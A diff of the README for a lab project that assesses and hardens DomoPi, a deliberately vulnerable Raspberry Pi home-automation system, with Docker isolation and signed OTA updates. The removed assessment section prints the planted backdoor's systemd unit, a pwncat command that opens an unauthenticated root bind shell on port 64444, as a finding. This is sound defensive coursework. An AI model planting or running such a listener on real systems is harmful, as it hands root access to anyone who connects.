@@ -1,196 +1,160 @@
 # DomoPi — Embedded Linux Security Hardening
 
-**Security Assessment | Docker Containerization | Container Hardening | Raspberry Pi**
+**IoT Security | Embedded Linux | Docker Hardening | Secure OTA Updates | Ed25519**
 
-## 1. Project Overview
+## Overview
 
-This project focuses on the security assessment and hardening of **DomoPi**, an intentionally vulnerable Raspberry Pi-based home automation system.
+DomoPi is an intentionally vulnerable Raspberry Pi-based home automation system used in an authorized cybersecurity laboratory.
 
-The objective is to identify and analyze existing security weaknesses, demonstrate their potential impact in an isolated laboratory environment, and implement mitigation strategies using **Docker containerization, least-privilege principles, service isolation, and network hardening**.
+This project focuses on assessing and mitigating security weaknesses in a customized embedded Linux environment while preserving its original kernel (`4.19.118-v8+`) and U-Boot boot chain.
 
-The original customized Linux kernel is preserved to maintain the security characteristics of the target environment.
+Two main security countermeasures were implemented:
 
-## 2. Technical Environment
+1. **Docker Container Hardening** — reducing the privileges and attack surface of a vulnerable Python web application.
+2. **Secure OTA Updates** — authenticating and verifying application updates using Ed25519 digital signatures and SHA-256 integrity checks.
+
+Additional host security improvements include SSH hardening, Lynis auditing, AIDE file integrity monitoring, and disabling unnecessary vulnerable services.
+
+## Technical Environment
 
 | Component | Technology |
 |---|---|
-| Target device | Raspberry Pi |
-| Operating system | Raspbian GNU/Linux 12 (Bookworm) |
-| Custom kernel | Linux `4.19.118-v8+` |
+| Target | Raspberry Pi |
+| OS | Debian/Raspbian 12 Bookworm |
+| Kernel | Custom Linux `4.19.118-v8+` |
 | Bootloader | U-Boot |
-| Custom boot image | `dv-domopi.fit` |
-| Host machine | Ubuntu Linux |
-| Remote administration | SSH |
-| Vulnerable application | Damn Small Vulnerable Webserver (DSVW) |
-| Security tools | Nmap, Linux systemd, Docker (planned) |
-| Hardening techniques | Container isolation, privilege reduction, firewall configuration |
+| Application | Damn Small Vulnerable Webserver (DSVW) |
+| Containerization | Docker |
+| OTA security | Ed25519, SHA-256 |
+| Security auditing | Lynis |
+| Integrity monitoring | AIDE |
+| Development host | Ubuntu Linux |
 
-### Environment Preparation
+## Initial Security Assessment
 
-The original system required an operating system migration to support the tools and functionalities needed for the security hardening activities.
+The initial assessment identified several security weaknesses:
 
-The migration was performed in stages:
+- An unauthenticated root bind shell exposed on TCP port `64444`.
+- A vulnerable Python web application running as root on TCP port `65412`.
+- Excessive application privileges and unnecessary service exposure.
+- Security limitations associated with the customized Linux kernel.
+
+The operating system was migrated from Raspbian Buster 10 through Bullseye 11 to Bookworm 12, while preserving the original kernel and boot chain.
+
+## Countermeasure 1 — Docker Container Hardening
+
+The vulnerable DSVW application was migrated from a privileged systemd service to a hardened Docker container.
+
+Security restrictions include:
+
+- Non-root execution (`UID 10001`).
+- Removal of Linux capabilities (`--cap-drop ALL`).
+- Prevention of privilege escalation (`no-new-privileges`).
+- Read-only root filesystem.
+- Restricted temporary storage.
+- Memory and process limits.
+- Localhost-only application binding.
+
+**Validation:** the hardened container remained operational and returned `HTTP 200` on `127.0.0.1:65413`.
+
+See [Docker Hardening](docs/docker-hardening.md) for implementation details and validation tests.
+
+## Countermeasure 2 — Secure Signed OTA Updates
+
+A secure application-level OTA update mechanism was implemented to protect Docker image updates against unauthorized modifications.
+
+### Architecture
 
 ```text
-Raspbian Buster 10
-        |
-        v
-Raspbian Bullseye 11
-        |
-        v
-Raspbian Bookworm 12
+Ubuntu Host / Lenovo
+    |
+    | Prepare Docker V2 archive
+    | Generate SHA-256 manifest
+    | Sign manifest with Ed25519 private key
+    |
+    v
+Raspberry Pi
+    |
+    | Verify Ed25519 signature
+    | Verify SHA-256 integrity
+    | Validate application version
+    | Load Docker image
+    | Deploy hardened V2 container
+    | Perform HTTP health check
+    |
+    v
+Application V2 — HTTP 200
 ```
 
-Before the migration, a complete SD card backup was created using `dd`.
+The private signing key remains on the development machine. The Raspberry Pi uses the corresponding public key for verification.
 
-The migration also involved resolving network connectivity and package management issues, including:
+### Security Validation
 
-- Configuring Ethernet connectivity between the Ubuntu host and the Raspberry Pi.
-- Establishing SSH access through a static IP address (`10.42.0.2`).
-- Correcting DNS resolution issues affecting APT repositories.
-- Updating the package repositories for Bookworm.
-- Preserving the custom U-Boot configuration and vulnerable kernel.
+| Test | Observed result |
+|---|---|
+| Authentic OTA package | Accepted |
+| Modified Docker archive | Rejected — SHA-256 mismatch |
+| Modified signed manifest | Rejected — invalid Ed25519 signature |
+| Authenticated V1 → V2 deployment | Successful |
+| Post-deployment HTTP check | HTTP 200 |
+| Persistent application version | `2.0.0` |
 
-The final environment was verified using:
+The deployment script also implements a rollback procedure, although recovery following a failed deployment has not yet been experimentally validated.
 
-```bash
-cat /etc/os-release
-uname -r
-```
+See [Secure OTA Updates](docs/secure-ota.md) for the cryptographic design, deployment workflow and test evidence.
 
-The system now runs **Raspbian Bookworm 12 with the original Linux 4.19.118-v8+ kernel**.
+## Additional Host Security Improvements
 
-## 3. Initial Security Assessment
+Host-level improvements were implemented alongside the two main countermeasures.
 
-The initial investigation involved examining the provided SD card image (`dv-domopi-student.img`), inspecting the Linux filesystem, identifying active services, and analyzing their security configurations.
+| Component | Result |
+|---|---|
+| Lynis | Hardening index improved from 60 to 64 |
+| AIDE | File integrity monitoring configured and tested |
+| SSH | Configuration hardened |
+| Backdoor service | Disabled |
+| Original DSVW service | Replaced by hardened Docker deployment |
 
-The disk partitions were exposed using:
+## Technical Limitations
 
-```bash
-sudo kpartx -av dv-domopi-student.img
-```
+The original customized kernel lacks several networking capabilities required for standard Docker bridge networking and netfilter-based firewall rules.
 
-The investigation identified several security concerns.
+As a result:
 
-### 3.1 Unauthenticated Root Bind Shell
+- `nftables` could not be deployed.
+- Docker operates using host networking rather than isolated bridge networking.
+- The OTA mechanism updates the application container, not the kernel or firmware.
+- Automatic rollback is implemented but still requires dedicated failure-recovery testing.
 
-A persistent backdoor was identified through the `backdoor.service` systemd unit.
+These constraints were retained and documented to preserve the original embedded environment.
 
-**Service configuration:**
-
-```ini
-[Service]
-Type=simple
-ExecStart=pwncat -l -e '/bin/bash' 64444 -k
-StandardInput=tty-force
-```
-
-The service listens on TCP port `64444` and launches a Bash shell with root privileges.
-
-**Security impact:**
-
-- Unauthenticated remote command execution.
-- Potential immediate root-level access.
-- Complete compromise of system confidentiality, integrity, and availability.
-
-This is a **bind shell**, because the target listens for incoming connections, rather than initiating a reverse connection.
-
-### 3.2 Vulnerable Web Application
-
-A second service, `dsvw.service`, was identified:
-
-```ini
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 /home/admin/DSVW/dsvw.py
-```
-
-The application listens on TCP port `65412` and runs as `root`.
-
-This creates a significant security risk because successful exploitation of an application-level vulnerability could allow commands to execute with excessive privileges.
-
-### 3.3 Additional Security Concerns
-
-Other areas identified for investigation include:
-
-- Weak or default system credentials.
-- Insecure storage of Wi-Fi credentials.
-- Excessive privileges assigned to application services.
-- Unnecessary network exposure.
-- Offline modification of an unencrypted SD card.
-- Potential tampering with the home automation application's licensing logic.
-
-These findings will be validated and addressed during the mitigation phase.
-
-## 4. Observed Services
-
-| Service | Port | Status | Security concern |
-|---|---|---|---|
-| `backdoor.service` | 64444/TCP | Running | Unauthenticated root bind shell |
-| `dsvw.service` | 65412/TCP | Running | Vulnerable Python webserver running as root |
-| `sshd` | 22/TCP | Running | Remote administration exposure |
-| `dnsmasq` | 53/TCP/UDP | Running | DNS service requiring controlled exposure |
-| `hostapd` | — | Enabled | Wi-Fi access point; operation to be verified |
-
-Service identification and verification were performed using:
-
-```bash
-sudo ss -tulpen
-sudo systemctl status backdoor.service dsvw.service
-sudo systemctl cat backdoor.service dsvw.service
-ps -ww -p 524,525 -o pid,ppid,user,args
-```
-
-## 5. Security Hardening Strategy
-
-The mitigation strategy follows a defense-in-depth approach.
-
-**Phase 1 — Security Assessment**
-- Identify exposed services and attack surfaces.
-- Analyze service privileges and configurations.
-- Document reproducible security findings.
-
-**Phase 2 — Docker Containerization**
-- Containerize the DSVW Python application.
-- Separate the application from the host environment.
-- Verify Docker compatibility with the custom kernel.
-
-**Phase 3 — Container and Host Hardening**
-- Run the application as a non-root user.
-- Restrict Linux capabilities and privilege escalation.
-- Limit filesystem access and container resources.
-- Apply network filtering and service minimization.
-- Disable the unauthorized backdoor in the hardened configuration.
-
-**Phase 4 — Security Validation**
-- Compare exposed services before and after mitigation.
-- Verify privilege restrictions.
-- Evaluate whether exploitation impact has been reduced.
-- Ensure legitimate application functionality remains available.
-
-<!--
-## 6. Repository Structure
+## Repository Structure
 
 ```text
 domopi-security-hardening/
 ├── README.md
-├── docs/
-│   ├── 01-initial-assessment.md
-│   ├── 02-environment-setup.md
-│   ├── 03-mitigations.md
-│   └── 04-validation.md
 ├── docker/
-├── screenshots/
+├── ota/
+├── configs/
+├── docs/
+│   ├── initial-assessment.md
+│   ├── docker-hardening.md
+│   ├── secure-ota.md
+│   └── host-hardening.md
+├── evidence/
+│   ├── docker/
+│   ├── ota/
+│   ├── lynis/
+│   └── aide/
 └── .gitignore
 ```
--->
 
-## 6. Disclaimer
+## Disclaimer
 
-This project is conducted in an **isolated, authorized educational laboratory** using an intentionally vulnerable system.
+This project was conducted in an isolated and authorized educational laboratory using an intentionally vulnerable system.
 
-All security assessments and exploitation demonstrations are intended exclusively for learning, vulnerability analysis, and defensive security research.
+All security testing and defensive experiments were performed for educational and research purposes.
 
 ---
 
-**Focus:** Embedded Linux Security · IoT Security · Docker Security · System Hardening
+**Focus:** Embedded Linux Security · IoT Security · Docker Hardening · Secure OTA · Cryptographic Verification
